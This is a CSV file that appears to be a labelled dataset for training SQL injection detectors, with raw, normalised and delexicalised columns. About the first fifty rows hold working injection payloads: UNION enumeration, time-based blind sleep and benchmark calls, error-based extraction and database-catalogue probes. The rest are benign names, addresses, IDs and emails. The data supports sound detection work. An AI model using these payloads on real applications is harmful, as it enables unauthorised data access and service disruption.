payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#","-1504"" ) as wpes where 6256 = 6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#","-<NUM>"" ) as wpes where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
1  )   where 9683  =  9683,1 ) where 9683 = 9683,<NUM> ) where <NUM> = <NUM>,1,False,,sqli_dataset
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1%' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,<NUM>%' ) ) ) or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #,1,False,,sqli_dataset
1  )   union all select null--,1 ) union all select null--,<NUM> ) union all select null--,1,False,,sqli_dataset
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )","1' ) and elt ( 1210 = 1210,sleep ( 5 ) )","<NUM>' ) and elt ( <NUM> = <NUM>,sleep ( <NUM> ) )",1,False,,sqli_dataset
"1 where 6040  =  6040 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1 where 6040 = 6040 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM> where <NUM> = <NUM> and <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
"-4954%""  )   or 5244  =  4832","-4954%"" ) or 5244 = 4832","-<NUM>%"" ) or <NUM> = <NUM>",1,False,,sqli_dataset
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh","1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""fkmh"" = ""fkmh",<NUM><STR>fkmh<STR>fkmh,1,False,,sqli_dataset
-8045   )    )     )   order by 1--,-8045 ) ) ) order by 1--,-<NUM> ) ) ) order by <NUM>--,1,False,,sqli_dataset
"1'  )   where 4786  =  4786 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","1' ) where 4786 = 4786 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM>' ) where <NUM> = <NUM> or ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --",1,True,,sqli_dataset
"1%"" order by 1--","1%"" order by 1--","<NUM>%"" order by <NUM>--",1,False,,sqli_dataset
1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1'|| ( select 'qtep' where 2572 = 2572 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,<NUM><STR>qtep' where <NUM> = <NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #,1,False,,sqli_dataset
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,<NUM> ) as zmxb where <NUM> = <NUM> and <NUM> = cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ) --,1,False,,sqli_dataset
"1"" union all select null,null,null,null,null,null,null--","1"" union all select null,null,null,null,null,null,null--","<NUM>"" union all select null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1   )    )    as queb where 2449  =  2449 union all select null,null#","1 ) ) as queb where 2449 = 2449 union all select null,null#","<NUM> ) ) as queb where <NUM> = <NUM> union all select null,null#",1,False,,sqli_dataset
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'javh'  =  'javh","1' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 'javh' = 'javh",<NUM><STR>javh<STR>javh,1,False,,sqli_dataset
1'  )   where 8167  =  8167,1' ) where 8167 = 8167,<NUM>' ) where <NUM> = <NUM>,1,False,,sqli_dataset
"1'   )    )    as hmyc where 6732  =  6732 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --","1' ) ) as hmyc where 6732 = 6732 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --","<NUM>' ) ) as hmyc where <NUM> = <NUM> and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,True,,sqli_dataset
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--","-9150%' ) ) ) union all select 7057,7057,7057,7057,7057,7057,7057,7057--","-<NUM>%' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy","1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""asvy"" = ""asvy",<NUM><STR>asvy<STR>asvy,1,True,,sqli_dataset
"1""   )    )     )","1"" ) ) )","<NUM>"" ) ) )",1,False,,sqli_dataset
"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw","-6760 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # ikqw","-<NUM> or <NUM> = convert ( int, ( select char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) # ikqw",1,True,,sqli_dataset
"1',iif  (  6625  =  6625,1,1/0  )","1',iif ( 6625 = 6625,1,1/0 )","<NUM>',iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )",1,False,,sqli_dataset
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi","select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'jloi' = 'jloi","select count ( * ) from generate_series ( <NUM>,<NUM> ) and ( ( <STR> = 'jloi",1,False,,sqli_dataset
"1""   )    )    as hace where 8785  =  8785","1"" ) ) as hace where 8785 = 8785","<NUM>"" ) ) as hace where <NUM> = <NUM>",1,False,,sqli_dataset
1%'  )   and 8734  =  5844,1%' ) and 8734 = 5844,<NUM>%' ) and <NUM> = <NUM>,1,False,,sqli_dataset
1 rlike sleep  (  5  ),1 rlike sleep ( 5 ),<NUM> rlike sleep ( <NUM> ),1,False,,sqli_dataset
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --","1"" ) as jmwr where 5978 = 5978 rlike ( select ( case when ( 1396 = 8762 ) then 1 else 0x28 end ) ) --","<NUM>"" ) as jmwr where <NUM> = <NUM> rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) --",1,True,,sqli_dataset
"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy","-9133"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""crfy"" = ""crfy",-<NUM><STR>crfy<STR>crfy,1,False,,sqli_dataset
1'+  (  select ntym where 4750  =  4750,1'+ ( select ntym where 4750 = 4750,<NUM>'+ ( select ntym where <NUM> = <NUM>,1,True,,sqli_dataset
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq","1"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""jgoq"" = ""jgoq",<NUM><STR>jgoq<STR>jgoq,1,False,,sqli_dataset
"1' where 9116  =  9116 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","1' where 9116 = 9116 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>' where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
-5089'   )    )    as icbb where 1129  =  1129 or 6250  =  9650,-5089' ) ) as icbb where 1129 = 1129 or 6250 = 9650,-<NUM>' ) ) as icbb where <NUM> = <NUM> or <NUM> = <NUM>,1,False,,sqli_dataset
"-5703'  )   or elt  (  2972  =  8708,8708  )","-5703' ) or elt ( 2972 = 8708,8708 )","-<NUM>' ) or elt ( <NUM> = <NUM>,<NUM> )",1,False,,sqli_dataset
"-6851'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'csfx'  =  'csfx","-6851' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'csfx' = 'csfx",-<NUM><STR>csfx<STR>csfx,1,True,,sqli_dataset
"1""  )   where 8153  =  8153","1"" ) where 8153 = 8153","<NUM>"" ) where <NUM> = <NUM>",1,False,,sqli_dataset
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,1' ) ) ) and sleep ( 5 ) and ( ( ( 'vbck' like 'vbck,<NUM><STR>vbck<STR>vbck,1,False,,sqli_dataset
1  )   where 2918  =  2918 and 7533  =  7533--,1 ) where 2918 = 2918 and 7533 = 7533--,<NUM> ) where <NUM> = <NUM> and <NUM> = <NUM>--,1,False,,sqli_dataset
"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--","-8609%"" ) ) ) union all select 6021,6021,6021,6021,6021,6021--","-<NUM>%"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp","select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'fegp' = 'fegp","select benchmark ( <NUM>,md5 ( 0x4c4d6142 ) ) and ( ( <STR> = 'fegp",1,True,,sqli_dataset
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  ""","1%"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh","1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""fpqh"" = ""fpqh",<NUM><STR>fpqh<STR>fpqh,1,False,,sqli_dataset
"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --","1 ) ) as rwsn where 9946 = 9946 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --","<NUM> ) ) as rwsn where <NUM> = <NUM> or extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ) --",1,True,,sqli_dataset
"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'","1'+ ( select wjpc where 5943 = 5943 and make_set ( 8403 = 8403,8899 ) ) +'",<NUM><STR>,1,True,,sqli_dataset
"1%'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   '%'  =  '","1%' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
-9456%'   )    )     )   order by 1#,-9456%' ) ) ) order by 1#,-<NUM>%' ) ) ) order by <NUM>#,1,False,,sqli_dataset
99745017c,99745017c,99745017c,0,False,,sqli_dataset
ejerci78,ejerci78,ejerci78,0,False,,sqli_dataset
"calle valencia de don juan 161, 7?d","calle valencia de don juan 161, 7?d","calle valencia de don juan <NUM>, <NUM>?d",0,False,,sqli_dataset
b3r3al,b3r3al,b3r3al,0,False,,sqli_dataset
46942381w,46942381w,46942381w,0,False,,sqli_dataset
elder@parcalia.hn,elder@parcalia.hn,elder@parcalia.hn,0,False,,sqli_dataset
24596413y,24596413y,24596413y,0,False,,sqli_dataset
compte,compte,compte,0,False,,sqli_dataset
leshowit,leshowit,leshowit,0,False,,sqli_dataset
lehar,lehar,lehar,0,False,,sqli_dataset
45699398p,45699398p,45699398p,0,False,,sqli_dataset
"calle profesor angel lacalle, s/n,","calle profesor angel lacalle, s/n,","calle profesor angel lacalle, s/n,",0,False,,sqli_dataset
tardn,tardn,tardn,0,False,,sqli_dataset
3.54937E+15,3.54937E+15,<NUM>54937E+<NUM>,0,True,,sqli_dataset
rigby,rigby,rigby,0,False,,sqli_dataset
caada del hoyo,caada del hoyo,caada del hoyo,0,False,,sqli_dataset
englert,englert,englert,0,False,,sqli_dataset
threader,threader,threader,0,False,,sqli_dataset
elias pallares,elias pallares,elias pallares,0,False,,sqli_dataset
f1581il2ente,f1581il2ente,f1581il2ente,0,False,,sqli_dataset
57317186j,57317186j,57317186j,0,False,,sqli_dataset
bocana$da,bocana$da,bocana$da,0,False,,sqli_dataset
escarpelo,escarpelo,escarpelo,0,False,,sqli_dataset
3.4008E+15,3.4008E+15,<NUM>4008E+<NUM>,0,True,,sqli_dataset
"calle limones, 60,","calle limones, 60,","calle limones, <NUM>,",0,False,,sqli_dataset
hana,hana,hana,0,False,,sqli_dataset
dillard,dillard,dillard,0,False,,sqli_dataset
casas de miravete,casas de miravete,casas de miravete,0,False,,sqli_dataset
olea de boedo,olea de boedo,olea de boedo,0,False,,sqli_dataset
empuar,empuar,empuar,0,False,,sqli_dataset
0o380ado6,0o380ado6,0o380ado6,0,False,,sqli_dataset
montroy,montroy,montroy,0,False,,sqli_dataset
99997973e,99997973e,99997973e,0,False,,sqli_dataset
8.36404E+15,8.36404E+15,<NUM>36404E+<NUM>,0,True,,sqli_dataset
"grupo fuensanta 197, 12?a","grupo fuensanta 197, 12?a","grupo fuensanta <NUM>, <NUM>?a",0,False,,sqli_dataset
jalance,jalance,jalance,0,False,,sqli_dataset
4.20136E+14,4.20136E+14,<NUM>20136E+<NUM>,0,True,,sqli_dataset
"c/ ricardo gutierrez 26, 8-d","c/ ricardo gutierrez 26, 8-d","c/ ricardo gutierrez <NUM>, <NUM>-d",0,False,,sqli_dataset
ivancevi,ivancevi,ivancevi,0,False,,sqli_dataset
castil de vela,castil de vela,castil de vela,0,False,,sqli_dataset
genaro,genaro,genaro,0,False,,sqli_dataset
ergasto,ergasto,ergasto,0,False,,sqli_dataset
"llosa de ranes, la","llosa de ranes, la","llosa de ranes, la",0,False,,sqli_dataset
es2eri5o,es2eri5o,es2eri5o,0,False,,sqli_dataset
cuenca,cuenca,cuenca,0,False,,sqli_dataset
02054707w,02054707w,02054707w,0,False,,sqli_dataset
21184515c,21184515c,21184515c,0,False,,sqli_dataset
5.71439E+15,5.71439E+15,<NUM>71439E+<NUM>,0,True,,sqli_dataset
marcano giner,marcano giner,marcano giner,0,False,,sqli_dataset
lemoine5@informatica2009.zr,lemoine5@informatica2009.zr,lemoine5@informatica2009.zr,0,False,,sqli_dataset
pr3caz,pr3caz,pr3caz,0,False,,sqli_dataset
marsh@comerciosaspe.ke,marsh@comerciosaspe.ke,marsh@comerciosaspe.ke,0,False,,sqli_dataset
inescourt7@citycvs.mil,inescourt7@citycvs.mil,inescourt7@citycvs.mil,0,False,,sqli_dataset
"c/ julia minguillon, 179, 7-a","c/ julia minguillon, 179, 7-a","c/ julia minguillon, <NUM>, <NUM>-a",0,False,,sqli_dataset
obsequ.iosa,obsequ.iosa,obsequ.iosa,0,False,,sqli_dataset
"calle carlos amel, 32, 12?h","calle carlos amel, 32, 12?h","calle carlos amel, <NUM>, <NUM>?h",0,False,,sqli_dataset
kallewar,kallewar,kallewar,0,False,,sqli_dataset
59760678p,59760678p,59760678p,0,False,,sqli_dataset
toperzer1,toperzer1,toperzer1,0,False,,sqli_dataset
canaan,canaan,canaan,0,False,,sqli_dataset
suzuki,suzuki,suzuki,0,False,,sqli_dataset
"antigua de ancora s/n,","antigua de ancora s/n,","antigua de ancora s/n,",0,False,,sqli_dataset
"calle dean miranda 106, 6-f","calle dean miranda 106, 6-f","calle dean miranda <NUM>, <NUM>-f",0,False,,sqli_dataset
madgett,madgett,madgett,0,False,,sqli_dataset
gerola pugliesi,gerola pugliesi,gerola pugliesi,0,False,,sqli_dataset
"c/ comedias, 109,","c/ comedias, 109,","c/ comedias, <NUM>,",0,False,,sqli_dataset
8.61689E+15,8.61689E+15,<NUM>61689E+<NUM>,0,True,,sqli_dataset
tanchak,tanchak,tanchak,0,False,,sqli_dataset
"don quijote 81,","don quijote 81,","don quijote <NUM>,",0,False,,sqli_dataset
ceferina,ceferina,ceferina,0,False,,sqli_dataset
saturnino,saturnino,saturnino,0,False,,sqli_dataset
israel_piggot@joyclub.pe,israel_piggot@joyclub.pe,israel_piggot@joyclub.pe,0,False,,sqli_dataset
5n37do,5n37do,5n37do,0,False,,sqli_dataset
lanfranchi@getgold.tl,lanfranchi@getgold.tl,lanfranchi@getgold.tl,0,False,,sqli_dataset
micaas,micaas,micaas,0,False,,sqli_dataset
herrmann@codwatw.edu,herrmann@codwatw.edu,herrmann@codwatw.edu,0,False,,sqli_dataset
9.48E+15,9.48E+15,<NUM>48E+<NUM>,0,True,,sqli_dataset
5.83899E+15,5.83899E+15,<NUM>83899E+<NUM>,0,True,,sqli_dataset
ajoy,ajoy,ajoy,0,False,,sqli_dataset
irissou,irissou,irissou,0,False,,sqli_dataset
quisto,quisto,quisto,0,False,,sqli_dataset
s5bal850de,s5bal850de,s5bal850de,0,False,,sqli_dataset
balsam-prey@mmo.com.cat,balsam-prey@mmo.com.cat,balsam-prey@mmo.com.cat,0,False,,sqli_dataset
lurlene,lurlene,lurlene,0,False,,sqli_dataset
"c/ elvas 112, 13-a","c/ elvas 112, 13-a","c/ elvas <NUM>, <NUM>-a",0,False,,sqli_dataset
"de canoves 13,","de canoves 13,","de canoves <NUM>,",0,False,,sqli_dataset
hembrick,hembrick,hembrick,0,False,,sqli_dataset
1.76488E+15,1.76488E+15,<NUM>76488E+<NUM>,0,True,,sqli_dataset
darcy@google-movil.dz,darcy@google-movil.dz,darcy@google-movil.dz,0,False,,sqli_dataset
katia,katia,katia,0,False,,sqli_dataset
lenya@fbi-criminal-network.com.mil,lenya@fbi-criminal-network.com.mil,lenya@fbi-criminal-network.com.mil,0,False,,sqli_dataset
3.81894E+15,3.81894E+15,<NUM>81894E+<NUM>,0,True,,sqli_dataset
penarroya ingla,penarroya ingla,penarroya ingla,0,False,,sqli_dataset
6.65741E+15,6.65741E+15,<NUM>65741E+<NUM>,0,True,,sqli_dataset
"calle artigako haritza, s/n 8?d","calle artigako haritza, s/n 8?d","calle artigako haritza, s/n <NUM>?d",0,False,,sqli_dataset
kiyohara,kiyohara,kiyohara,0,False,,sqli_dataset
iracema,iracema,iracema,0,False,,sqli_dataset
recabdador,recabdador,recabdador,0,False,,sqli_dataset
bernadet,bernadet,bernadet,0,False,,sqli_dataset
76150645z,76150645z,76150645z,0,False,,sqli_dataset
nehemiah,nehemiah,nehemiah,0,False,,sqli_dataset
reiji,reiji,reiji,0,False,,sqli_dataset
"plaa gabriela mistral, 140","plaa gabriela mistral, 140","plaa gabriela mistral, <NUM>",0,False,,sqli_dataset
mirabel,mirabel,mirabel,0,False,,sqli_dataset
sanidad,sanidad,sanidad,0,False,,sqli_dataset
arriharn espinet,arriharn espinet,arriharn espinet,0,False,,sqli_dataset
alguer murillo,alguer murillo,alguer murillo,0,False,,sqli_dataset
swearing,swearing,swearing,0,False,,sqli_dataset
lightfie,lightfie,lightfie,0,False,,sqli_dataset
epnimo,epnimo,epnimo,0,False,,sqli_dataset
guillen,guillen,guillen,0,False,,sqli_dataset
mahbeer,mahbeer,mahbeer,0,False,,sqli_dataset
zohar@pablobracamonte.bh,zohar@pablobracamonte.bh,zohar@pablobracamonte.bh,0,False,,sqli_dataset
azarshah,azarshah,azarshah,0,False,,sqli_dataset
m7124v3,m7124v3,m7124v3,0,False,,sqli_dataset
medianero,medianero,medianero,0,False,,sqli_dataset
euzaine@schnapps.com.gs,euzaine@schnapps.com.gs,euzaine@schnapps.com.gs,0,False,,sqli_dataset
amelia,amelia,amelia,0,False,,sqli_dataset
estival,estival,estival,0,False,,sqli_dataset
3.98E+15,3.98E+15,<NUM>98E+<NUM>,0,True,,sqli_dataset
"calle manco, 109, 10-g","calle manco, 109, 10-g","calle manco, <NUM>, <NUM>-g",0,False,,sqli_dataset
vinko,vinko,vinko,0,False,,sqli_dataset
parke antonio trueba 175,parke antonio trueba 175,parke antonio trueba <NUM>,0,False,,sqli_dataset
8.5138E+15,8.5138E+15,<NUM>5138E+<NUM>,0,True,,sqli_dataset
9.84215E+15,9.84215E+15,<NUM>84215E+<NUM>,0,True,,sqli_dataset
"calle la revoltosa, 55, 11c","calle la revoltosa, 55, 11c","calle la revoltosa, <NUM>, 11c",0,False,,sqli_dataset
"calle hostieros, 24","calle hostieros, 24","calle hostieros, <NUM>",0,False,,sqli_dataset
condensativo,condensativo,condensativo,0,False,,sqli_dataset
5.88977E+15,5.88977E+15,<NUM>88977E+<NUM>,0,True,,sqli_dataset
poma gozalbo,poma gozalbo,poma gozalbo,0,False,,sqli_dataset
40592671v,40592671v,40592671v,0,False,,sqli_dataset
contreras,contreras,contreras,0,False,,sqli_dataset
ma724-3ra,ma724-3ra,ma724-3ra,0,False,,sqli_dataset
olaya,olaya,olaya,0,False,,sqli_dataset
lula,lula,lula,0,False,,sqli_dataset
9.84is22nte334c799,9.84is22nte334c799,<NUM>84is22nte334c799,0,False,,sqli_dataset
rub de bracamonte,rub de bracamonte,rub de bracamonte,0,False,,sqli_dataset
75771832b,75771832b,75771832b,0,False,,sqli_dataset
muthuswa,muthuswa,muthuswa,0,False,,sqli_dataset
d76en3r9n8z01,d76en3r9n8z01,d76en3r9n8z01,0,False,,sqli_dataset
"c/ padilla, 74 12h","c/ padilla, 74 12h","c/ padilla, <NUM> 12h",0,False,,sqli_dataset
8.85119E+15,8.85119E+15,<NUM>85119E+<NUM>,0,True,,sqli_dataset
salter@quiromante.com.mg,salter@quiromante.com.mg,salter@quiromante.com.mg,0,False,,sqli_dataset
es3regamiento,es3regamiento,es3regamiento,0,False,,sqli_dataset
aflechate,aflechate,aflechate,0,False,,sqli_dataset
63829565b,63829565b,63829565b,0,False,,sqli_dataset
60613075w,60613075w,60613075w,0,False,,sqli_dataset
freydig rueda,freydig rueda,freydig rueda,0,False,,sqli_dataset
itrabo,itrabo,itrabo,0,False,,sqli_dataset
credido poma,credido poma,credido poma,0,False,,sqli_dataset
gula,gula,gula,0,False,,sqli_dataset
